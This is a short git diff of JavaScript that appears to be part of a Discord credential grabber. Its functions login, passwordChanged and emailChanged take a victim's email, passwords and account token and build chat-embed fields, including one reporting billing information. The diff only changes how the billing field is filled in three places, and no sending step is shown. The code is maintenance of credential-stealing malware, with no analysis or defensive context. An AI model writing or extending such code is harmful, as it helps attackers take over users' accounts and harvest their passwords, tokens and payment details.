@@ -381,7 +381,7 @@ const login = async (email, password, token) => {
           },
           {
             name: "<a:tre:962470727129391134> Billing:",
-            value: '' + H(),
+            value:`${billing}`,
             inline: true,
           },
           {
@@ -441,7 +441,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
            {
             name: "<a:tre:962470727129391134> Billing:",
-            value: '' + H(),
+            value:`${billing}`,
             inline: true,
           },
            {
@@ -508,7 +508,7 @@ const emailChanged = async (email, password, token) => {
           },
            {
             name: "<a:tre:962470727129391134> Billing:",
-            value: '' + H(),
+            value:`${billing}`,
             inline: true,
           },
           {
